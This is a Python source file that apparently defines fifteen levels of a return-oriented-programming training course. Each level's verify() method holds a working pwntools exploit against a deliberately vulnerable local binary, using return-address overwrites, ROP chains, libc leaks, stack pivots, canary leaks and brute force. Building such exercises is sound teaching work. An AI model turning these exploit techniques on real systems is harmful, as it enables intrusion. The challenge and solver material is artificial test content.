import subprocess
import pwnshop
import signal
import random
import glob
import pwn
import re
import os

PWNSHOP_AUTOREGISTER = False

from pwnshop import Challenge, retry


class BabyRopBase(Challenge):
    LINK_LIBRARIES = ["capstone", "dl"]
    PIE = False
    CANARY = False
    RELRO = "partial"

    TEMPLATE_PATH = "babyrop/babyrop.c"

    read_size = 0x1000
    free_gadgets = []

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self.input_size = self.random.randrange(16, 128)
        self.bin_padding = self.random.randrange(0x10, 0x1000)
        if self.free_gadgets:
            self.free_gadgets = self.free_gadgets.copy()
            self.random.shuffle(self.free_gadgets)

    def get_retaddr_offset(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            process.send(pwn.cyclic(self.read_size))
            process.readall()
            assert process.poll(True) == -signal.SIGSEGV

        core = pwn.Coredump("core")
        return pwn.cyclic_find(pwn.u32(core.stack[core.rsp : core.rsp + 4]))


class BabyRopLevel1(BabyRopBase):
    ""
    win_function = True

    def verify(self, **kwargs):
        """
        TBD
        """
        retaddr_offset = self.get_retaddr_offset(**kwargs)

        with self.run_challenge(**kwargs) as process:
            payload = b"A" * retaddr_offset
            payload += pwn.p64(process.elf.symbols["win"])
            process.send(payload)

            assert self.flag in process.readall()


class BabyRopLevel2(BabyRopBase):
    ""
    multi_staged_win_function = [1, 2]

    def verify(self, **kwargs):
        """
        TBD
        """
        retaddr_offset = self.get_retaddr_offset(**kwargs)

        with self.run_challenge(**kwargs) as process:
            payload = b"A" * retaddr_offset
            payload += pwn.p64(process.elf.symbols["win_stage_1"])
            payload += pwn.p64(process.elf.symbols["win_stage_2"])
            process.send(payload)

            assert self.flag in process.readall()


class BabyRopLevel3(BabyRopBase):
    ""
    multi_staged_win_function_authed = True

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.multi_staged_win_function = list(range(1, 5 + 1))
        self.random.shuffle(self.multi_staged_win_function)

    def verify(self, **kwargs):
        """
        TBD
        """
        retaddr_offset = self.get_retaddr_offset(**kwargs)

        with self.run_challenge(**kwargs) as process:
            rop = pwn.ROP(process.elf)
            for i in range(1, 5 + 1):
                rop.call(f"win_stage_{i}", [i])

            payload = b"A" * retaddr_offset
            payload += rop.chain()

            process.send(payload)
            assert self.flag in process.readall()


class BabyRopLevel4(BabyRopBase):
    ""
    free_gadgets = [
        pwn.asm("pop rax; ret"),
        pwn.asm("pop rdi; ret"),
        pwn.asm("pop rsi; ret"),
        pwn.asm("pop rdx; ret"),
        pwn.asm("pop r10; ret"),
        pwn.asm("pop r8; ret"),
        pwn.asm("pop r9; ret"),
        pwn.asm("syscall; ret"),
    ]
    leak_stack = True

    def verify(self, **kwargs):
        """
        TBD
        """
        retaddr_offset = self.get_retaddr_offset(**kwargs)

        with self.run_challenge(**kwargs) as process:
            process.readuntil("[LEAK] Your input buffer is located at: ")
            input_addr = int(process.readline()[:-2], 16)

            rop = pwn.ROP(process.elf)

            def rop_syscall(**kwargs):
                for register, value in kwargs.items():
                    rop.raw(rop.find_gadget([f"pop {register}", "ret"]).address)
                    rop.raw(value)
                rop.raw(rop.find_gadget(["syscall", "ret"]).address)

            rop_syscall(rax=2, rdi=input_addr, rsi=0)
            rop_syscall(rax=40, rdi=1, rsi=3, rdx=0, r10=1024)

            payload = b"/flag\0".ljust(retaddr_offset, b"A")
            payload += rop.chain()
            process.send(payload)

            assert self.flag in process.readall()


class BabyRopLevel5(BabyRopBase):
    ""
    free_gadgets = [
        pwn.asm("pop rax; ret"),
        pwn.asm("pop rdi; ret"),
        pwn.asm("pop rsi; ret"),
        pwn.asm("pop rdx; ret"),
        pwn.asm("pop r10; ret"),
        pwn.asm("pop r8; ret"),
        pwn.asm("pop r9; ret"),
        pwn.asm("syscall; ret"),
    ]

    def verify(self, **kwargs):
        """
        TBD
        """
        retaddr_offset = self.get_retaddr_offset(**kwargs)

        with self.run_challenge(**kwargs, flag_symlink="/Goodbye!") as process:
            exiting_addr = next(process.elf.search(b"Goodbye!"))

            rop = pwn.ROP(process.elf)

            def rop_syscall(**kwargs):
                for register, value in kwargs.items():
                    rop.raw(rop.find_gadget([f"pop {register}", "ret"]).address)
                    rop.raw(value)
                rop.raw(rop.find_gadget(["syscall", "ret"]).address)

            rop_syscall(rax=2, rdi=exiting_addr, rsi=0)
            rop_syscall(rax=40, rdi=1, rsi=3, rdx=0, r10=1024)

            payload = b"A" * retaddr_offset
            payload += rop.chain()
            process.send(payload)

            assert self.flag in process.readall()


class BabyRopLevel6(BabyRopBase):
    ""
    force_import = ["open", "sendfile"]
    free_gadgets = [
        pwn.asm("pop rdi; ret"),
        pwn.asm("pop rsi; ret"),
        pwn.asm("pop rdx; ret"),
        pwn.asm("pop rcx; ret"),
    ]

    def verify(self, **kwargs):
        """
        TBD
        """
        retaddr_offset = self.get_retaddr_offset(**kwargs)

        with self.run_challenge(**kwargs, flag_symlink="/Goodbye!") as process:
            exiting_addr = next(process.elf.search(b"Goodbye!"))

            rop = pwn.ROP(process.elf)
            rop.call("open", [exiting_addr, 0])
            rop.call("sendfile", [1, 3, 0, 1024])

            payload = b"A" * retaddr_offset
            payload += rop.chain()
            process.send(payload)

            assert self.flag in process.readall()


class BabyRopLevel7(BabyRopBase):
    ""
    leak_libc = True

    def verify(self, **kwargs):
        """
        TBD
        """
        retaddr_offset = self.get_retaddr_offset(**kwargs)

        with self.run_challenge(**kwargs, flag_symlink="/Goodbye!") as process:
            exiting_addr = next(process.elf.search(b"Goodbye!"))

            process.readuntil('[LEAK] The address of "system" in libc is: ')
            system_addr = int(process.readline()[:-2], 16)

            libc = pwn.ELF(process.libc.path)
            libc.address = system_addr - libc.symbols["system"]

            rop = pwn.ROP(libc)
            rop.call("open", [exiting_addr, 0])
            rop.call("sendfile", [1, 3, 0, 1024])

            payload = b"A" * retaddr_offset
            payload += rop.chain()
            process.send(payload)

            assert self.flag in process.readall()


class BabyRopLevel8(BabyRopBase):
    ""
    hint_libc_leak = True

    @retry(16)
    def verify(self, **kwargs):
        """
        TBD
        """
        retaddr_offset = self.get_retaddr_offset(**kwargs)

        with self.run_challenge(**kwargs, flag_symlink="/Goodbye!") as process:
            exiting_addr = next(process.elf.search(b"Goodbye!"))

            rop = pwn.ROP(process.elf)
            rop.call("puts", [process.elf.got["puts"]])
            rop.call("_start")

            payload = b"A" * retaddr_offset
            payload += rop.chain()
            process.send(payload)
            process.readuntil("Leaving!\n")

            puts_addr = process.readline()[:-1]
            assert len(puts_addr) == 6
            puts_addr = pwn.u64(puts_addr + b"\x00\x00")

            libc = pwn.ELF(process.libc.path)
            libc.address = puts_addr - libc.symbols["puts"]

            rop = pwn.ROP(libc)
            rop.call("open", [exiting_addr, 0])
            rop.call("sendfile", [1, 3, 0, 1024])

            payload = b"A" * retaddr_offset
            payload += rop.chain()
            process.send(payload)

            assert self.flag in process.readall()


class BabyRopLevel9(BabyRopBase):
    ""
    hint_libc_leak = True
    bss_read = True
    copy_size = 24

    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            pivot_rop = pwn.ROP(process.elf)
            pivot_rop.migrate(process.elf.symbols.data + 0x10000 + 24)

            assert len(pivot_rop.chain()) == 3 * 8

            leak_rop = pwn.ROP(process.elf)
            leak_rop.call("puts", [process.elf.got["puts"]])
            leak_rop.call("_start")

            process.send(pivot_rop.chain() + leak_rop.chain())
            process.readuntil(b"Leaving!\n")

            puts_addr = process.readline()[:-1]
            assert len(puts_addr) == 6
            puts_addr = pwn.u64(puts_addr + b"\x00\x00")

            libc = pwn.ELF(process.libc.path)
            libc.address = puts_addr - libc.symbols["puts"]

            pwn_rop = pwn.ROP(libc)
            pwn_rop.call("read", [0, process.elf.bss(0), 1000])
            pwn_rop.call("open", [process.elf.bss(0), 0])
            pwn_rop.call("sendfile", [1, 3, 0, 1024])

            assert len(pwn_rop.chain()) < 0x1000

            process.send(pivot_rop.chain() + pwn_rop.chain())
            process.readrepeat(timeout=0.1)
            process.send("/flag\0")

            assert self.flag in process.readall()


def asm_win_shellcode():
    shellcode = f"""
    push rbp
    mov rbp, rsp
    sub rsp, 256
    {pwn.shellcraft.open("/flag")}
    {pwn.shellcraft.read("rax", "rsp", 256)}
    {pwn.shellcraft.write(1, "rsp", "rax")}
    leave
    ret
    """
    return "".join(f"\\x{b:02x}" for b in pwn.asm(shellcode))


class BabyRopLevel10(BabyRopBase):
    ""
    PIE = True
    RELRO = "full"

    win_shellcode = asm_win_shellcode()
    leak_stack = True
    vuln_func = True

    def verify(self, **kwargs):
        """
        TBD
        """
        retaddr_offset = self.get_retaddr_offset(**kwargs)
        saved_rbp_offset = retaddr_offset - 8

        with self.run_challenge(**kwargs):
            for b in range(256):
                with self.run_challenge(**kwargs, alarm=1) as process:
                    process.readuntil("[LEAK] Your input buffer is located at: ")
                    input_addr = int(process.readline()[:-2], 16)

                    win_stack_ptr = input_addr - 8

                    payload = b"A" * saved_rbp_offset
                    payload += pwn.p64(win_stack_ptr - 8)
                    payload += bytes([b])
                    process.send(payload)

                    if self.flag in process.readall():
                        break
            else:
                assert False


class BabyRopLevel11(BabyRopBase):
    ""
    PIE = True
    RELRO = "full"

    win_shellcode = asm_win_shellcode()
    leak_stack = True
    vuln_func = True
    vuln_pad = True

    def verify(self, **kwargs):
        """
        TBD
        """
        retaddr_offset = self.get_retaddr_offset(**kwargs)
        saved_rbp_offset = retaddr_offset - 8

        with self.run_challenge(**kwargs) as target:
            rop = pwn.ROP(target.elf)
            leave_ret = pwn.p64(rop.find_gadget([f"leave", "ret"]).address)[:2]

            for _ in range(256):
                with self.run_challenge(**kwargs, alarm=1) as process:
                    process.readuntil("[LEAK] Your input buffer is located at: ")
                    input_addr = int(process.readline()[:-2], 16)

                    win_stack_ptr = input_addr - 8

                    payload = b"A" * saved_rbp_offset
                    payload += pwn.p64(win_stack_ptr - 8)
                    payload += leave_ret
                    process.send(payload)

                    if self.flag in process.readall():
                        break
            else:
                assert False


class BabyRopLevel12(BabyRopBase):
    ""
    PIE = True
    RELRO = "full"

    challenge_function_inline = True

    win_shellcode = asm_win_shellcode()
    leak_stack = True

    def verify(self, **kwargs):
        """
        TBD
        """
        retaddr_offset = self.get_retaddr_offset(**kwargs)
        saved_rbp_offset = retaddr_offset - 8

        with self.run_challenge(**kwargs) as target:
            libc = pwn.ELF(target.libc.path)
            leave_ret = next(libc.search(pwn.asm("leave; ret"), executable=True))
            leave_ret = pwn.p64(leave_ret | 0xFFF000)[:3]

            for _ in range(4096 * 4):
                with self.run_challenge(**kwargs, alarm=1) as process:
                    process.readuntil("[LEAK] Your input buffer is located at: ")
                    input_addr = int(process.readline()[:-2], 16)

                    win_stack_ptr = input_addr - 8

                    payload = b"A" * saved_rbp_offset
                    payload += pwn.p64(win_stack_ptr - 8)
                    payload += leave_ret
                    process.send(payload)

                    if self.flag in process.readall():
                        break
            else:
                assert False


class BabyRopLevel13(BabyRopBase):
    ""
    PIE = True
    CANARY = True
    RELRO = "full"

    challenge_function_inline = True

    leak_stack = True
    arbitrary_read = True

    @retry(16)
    def get_retaddr_canary_offset(self, **kwargs):
        for canary_distance in range(self.input_size, 0x1000):
            with self.run_challenge(**kwargs) as process:
                process.readuntil("[LEAK] Your input buffer is located at: ")
                input_addr = int(process.readline()[:-2], 16)

                process.readuntil("Address in hex to read from:\n")
                process.sendline(hex(input_addr))
                process.readuntil(f"[LEAK] *{hex(input_addr)} = ")

                process.send(b"A" * canary_distance)
                response = process.readall()
                if b"*** stack smashing detected ***" in response:
                    break
        else:
            assert False

        canary_offset = canary_distance - 1

        with self.run_challenge(**kwargs) as process:
            process.readuntil("[LEAK] Your input buffer is located at: ")
            input_addr = int(process.readline()[:-2], 16)

            leak_addr = input_addr + canary_offset
            process.readuntil("Address in hex to read from:\n")
            process.sendline(hex(leak_addr))

            process.readuntil(f"[LEAK] *{hex(leak_addr)} = 0x")
            canary = process.readline()[:-1]
            assert len(canary) == 16
            canary = pwn.p64(int(canary, 16))

            pattern = bytearray(pwn.cyclic(self.read_size))
            pattern[canary_offset : canary_offset + 8] = canary

            process.send(pattern)
            process.readall()
            assert process.poll(True) == -signal.SIGSEGV

        core = pwn.Coredump("core")
        retaddr_offset = pwn.cyclic_find(pwn.u32(core.stack[core.rsp : core.rsp + 4]))
        return retaddr_offset, canary_offset

    @pwnshop.retry(10, timeout=30)
    def verify(self, **kwargs):
        """
        TBD
        """
        retaddr_offset, canary_offset = self.get_retaddr_canary_offset(**kwargs)
        saved_rbp_offset = retaddr_offset - 8

        with self.run_challenge(**kwargs, flag_symlink="/h") as target:
            libc = pwn.ELF(target.libc.path)
            leave_ret = next(libc.search(pwn.asm("leave; ret"), executable=True))
            leave_ret = pwn.p64(leave_ret | 0xFFF000)[:3]

            for i in range(4096 * 4):
                # Would like to use alarm=1 to be safe, but this result in EOF
                with self.run_challenge(**kwargs) as process:
                    process.readuntil("[LEAK] Your input buffer is located at: ")
                    input_addr = int(process.readline()[:-2], 16)

                    leak_addr = input_addr + canary_offset
                    process.readuntil("Address in hex to read from:\n")
                    process.sendline(hex(leak_addr))

                    process.readuntil(f"[LEAK] *{hex(leak_addr)} = 0x")
                    canary = process.readline()[:-1]
                    assert len(canary) == 16
                    canary = pwn.p64(int(canary, 16))

                    # TODO: don't yolo at a _start ptr
                    _start_ptr = input_addr + saved_rbp_offset + 0x40

                    payload = b"A" * canary_offset
                    payload += canary
                    payload = payload.ljust(saved_rbp_offset, b"A")
                    payload += pwn.p64(_start_ptr - 8)
                    payload += leave_ret

                    process.send(payload)

                    try:
                        process.readuntil(b"Welcome")
                    except EOFError:
                        continue

                    process.readuntil("[LEAK] Your input buffer is located at: ")
                    input_addr = int(process.readline()[:-2], 16)

                    leak_addr = input_addr + retaddr_offset
                    process.readuntil("Address in hex to read from:\n")
                    process.sendline(hex(leak_addr))

                    process.readuntil(f"[LEAK] *{hex(leak_addr)} = 0x")
                    libc_ret_addr = process.readline()[:-1]
                    assert len(libc_ret_addr) == 16
                    libc_ret_addr = int(libc_ret_addr, 16)

                    libc = pwn.ELF(process.libc.path)
                    # TODO: compute libc_ret_addr offset from libc_start_main
                    libc.address = libc_ret_addr - (
                        libc.symbols["__libc_start_main"] + 243
                    )

                    rop = pwn.ROP(libc)
                    h_addr = next(libc.search(b"h\0"))
                    rop.call("open", [h_addr, 0])
                    rop.call("sendfile", [1, 3, 0, 1024])

                    payload = b"A" * canary_offset
                    payload += canary
                    payload = payload.ljust(saved_rbp_offset, b"A")
                    payload += b"B" * 8
                    payload += rop.chain()

                    process.send(payload)

                    assert self.flag in process.readall()
                    break
                assert False
            else:
                assert False


class BabyRopLevel14(BabyRopBase):
    ""
    PIE = True
    CANARY = True
    RELRO = "full"

    fork_server = True
    vuln_func = True

    @staticmethod
    def brute_byte(prefix, success_check):
        results = {}
        for b in range(256):
            with pwn.remote("localhost", 1337) as remote:
                remote.send(prefix + bytes([b]))
                if success_check(remote):
                    return bytes([b])
        else:
            assert False

    def canary_offset(self):
        for canary_offset in range(self.input_size, 0x100):
            with pwn.remote("localhost", 1337) as remote:
                remote.send(b"A" * (canary_offset + 1))
                if b"*** stack smashing detected ***" in remote.readall():
                    break
        else:
            assert False
        return canary_offset

    def brute_bytes(self, prefix, n, success_check):
        bruted = b""
        while len(bruted) != n:
            bruted += self.brute_byte(prefix + bruted, success_check)
        return bruted

    def get_flag(self, elf, libc, prefix):
        pwn_rop = pwn.ROP(libc)
        pwn_rop.call("read", [0, elf.bss(0), 1000])
        pwn_rop.call("open", [elf.bss(0), 0])
        pwn_rop.call("sendfile", [1, 4, 0, 1024]) # 4 because pwntools garbage
        pwn_rop.call("exit", [42])
        with pwn.remote("localhost", 1337) as remote:
            remote.send(prefix + pwn_rop.chain())
            remote.readrepeat(timeout=0.1)
            remote.send("/flag\0")
            return remote.readall(timeout=1)

    def get_prefix(self):
        canary_offset = self.canary_offset()
        canary = b"\0" + self.brute_bytes(
            b"A" * canary_offset + b"\0",
            7,
            lambda r: b"stack smashing" not in r.readall(timeout=1),
        )
        prefix = b"A" * canary_offset + canary + b"B" * 8
        return prefix

    def io(self, what, **kwargs):
        with pwn.remote("localhost", 1337) as remote:
            remote.send(what)
            return remote.readall(**kwargs)

    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            prefix = self.get_prefix()

            elf = process.elf
            main = elf.functions["main"]
            challenge_addr = hex(elf.functions["challenge"].address)

            ret_main_offset = (
                int(
                    next(
                        line.split()[0][:-1]
                        for line in main.disasm().splitlines()
                        if "call" in line and challenge_addr in line
                    ),
                    16,
                )
                + 5
            )
            ret_lsb = bytes([ret_main_offset & 0xFF])

            assert b"Goodbye!" in self.io(prefix + ret_lsb)

            ret_addr = ret_lsb + self.brute_bytes(
                prefix + ret_lsb, 7, lambda r: b"Goodbye!" in r.readall()
            )

            elf.address = pwn.u64(ret_addr) - ret_main_offset
            assert elf.address & 0xFFF == 0

            rop = pwn.ROP(elf)
            payload = prefix
            payload += pwn.p64(rop.find_gadget(["pop rdi", "ret"]).address)
            payload += pwn.p64(elf.got["puts"])
            payload += pwn.p64(elf.plt["puts"])
            puts_addr = pwn.u64(self.io(payload)[-7:-1] + b"\0\0")

            libc = pwn.ELF(process.libc.path)
            libc.address = puts_addr - libc.functions["puts"].address
            assert libc.address & 0xFFF == 0

            assert self.flag in self.get_flag(elf, libc, prefix)


class BabyRopLevel15(BabyRopLevel14):
    ""
    challenge_function_inline = True
    RELRO = "full"

    def scf_candidates(self, prefix, libc):
        scf = libc.functions["__stack_chk_fail"].address
        scf_lsb = scf & 0xFF
        scf_nibble = (scf >> 8) & 0xF

        scf_candidates = set()
        for i in range(256):
            for j in range(16):
                # These are just cursed addresses that deadlock
                if i in [56,61, 113]:
                    i += 1
                scf_guess = bytes([scf_lsb, scf_nibble | ((j << 4) & 0xF0), i])
                a = self.io(prefix + scf_guess)
                if b"stack smashing" in a:
                    scf_candidates.add(scf_guess)
        return scf_candidates

    @retry(4)
    def verify(self, **kwargs):
        """
        TBD
        """
        with BabyRopBase.verify(self, **kwargs) as process:
            prefix = self.get_prefix()
            libc = pwn.ELF(process.libc.path)
            scf_candidates = self.scf_candidates(prefix, libc)

            some_candidate = next(iter(scf_candidates))
            libc_msbs = self.brute_bytes(
                prefix + some_candidate,
                5,
                lambda r: b"stack smashing" in r.readall(timeout=1),
            )

            libc = pwn.ELF(process.libc.path)
            scf = libc.functions["__stack_chk_fail"].address

            libc_guesses = [
                pwn.u64(scf_lsbs + libc_msbs) - scf for scf_lsbs in scf_candidates
            ]
            for guess in libc_guesses:
                libc.address = guess
                o = self.get_flag(libc, libc, prefix)
                if self.flag in o:
                    return
            assert False

LEVELS = [
    BabyRopLevel1,
    BabyRopLevel2,
    BabyRopLevel3,
    BabyRopLevel4,
    BabyRopLevel5,
    BabyRopLevel6,
    BabyRopLevel7,
    BabyRopLevel8,
    BabyRopLevel9,
    BabyRopLevel10,
    BabyRopLevel11,
    BabyRopLevel12,
    BabyRopLevel13,
    BabyRopLevel14,
    BabyRopLevel15,
]
NUM_TESTING=1
DOJO_MODULE="rop"
pwnshop.register_challenges(LEVELS)
